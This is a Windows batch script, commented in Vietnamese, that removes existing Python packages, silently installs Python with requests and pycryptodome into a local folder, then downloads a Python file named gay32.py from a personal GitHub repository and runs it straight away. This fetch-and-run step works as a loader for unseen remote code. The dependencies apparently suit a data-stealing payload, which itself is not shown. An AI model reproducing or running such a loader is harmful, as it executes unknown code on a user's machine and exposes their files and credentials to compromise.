@echo off
setlocal

:: Thiết lập đường dẫn đầy đủ đến thư mục env
set "env_dir=%~dp0env"

:: Kiểm tra xem đã có Python cài đặt trên máy tính không
python --version >nul 2>&1
if %errorlevel% equ 0 (
    echo Đã phát hiện Python đã cài đặt trên máy tính. Đang gỡ cài đặt phiên bản hiện tại...
    :: Gỡ cài đặt Python hiện tại
    start /wait cmd /c "python -m pip uninstall -y python && python -m pip uninstall -y pycryptodome && python -m pip uninstall -y requests"
)

:: Tạo thư mục env nếu chưa tồn tại
mkdir "%env_dir%" 2>nul

:: Di chuyển đến thư mục env
cd "%env_dir%"

:: Kiểm tra Python đã được cài đặt trong thư mục env chưa
if not exist "%env_dir%\python.exe" (
    echo Python chưa được cài đặt trong thư mục env. Đang tải Python...
    :: Tải Python installer
    powershell -Command "Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.10.5/python-3.10.5-amd64.exe -OutFile python_installer.exe"
    :: Cài đặt Python vào thư mục env
    start /wait python_installer.exe /quiet InstallAllUsers=0 TargetDir="%env_dir%" PrependPath=0
    :: Xóa installer sau khi cài đặt
    del python_installer.exe

    :: Cài đặt pip vào thư mục env nếu chưa có
    python -m ensurepip

    :: Nâng cấp pip lên phiên bản mới nhất
    python -m pip install --upgrade pip

    :: Cài đặt các module cần thiết vào thư mục env
    python -m pip install requests pycryptodome
)

:: Tải file Python từ URL vào thư mục env
echo Đang tải file Python...
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/tranminhquang2347/test2/main/gay32.py -OutFile gay32.py"

:: Chạy script Python
echo Đang chạy script Python...
python gay32.py

endlocal
